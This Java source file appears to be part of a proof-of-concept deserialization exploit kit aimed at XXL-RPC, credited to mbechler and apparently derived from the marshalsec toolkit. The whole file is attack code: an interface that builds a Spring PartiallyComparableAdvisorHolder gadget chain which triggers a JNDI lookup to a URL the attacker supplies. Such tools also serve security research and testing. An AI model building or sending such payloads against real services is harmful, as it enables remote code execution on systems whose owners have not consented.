package com.xxl.rpc.core.poc;

import org.springframework.beans.factory.BeanFactory;


/**
 * @author mbechler
 *
 */
public interface SpringPartiallyComparableAdvisorHolder extends Gadget {

    default Object makePartiallyComparableAdvisorHolder (UtilFactory uf, String[] args ) throws Exception {
        String jndiUrl = args[ 0 ];
        BeanFactory bf = SpringUtil.makeJNDITrigger(jndiUrl);
        return SpringUtil.makeBeanFactoryTriggerPCAH(uf, jndiUrl, bf);
    }
}
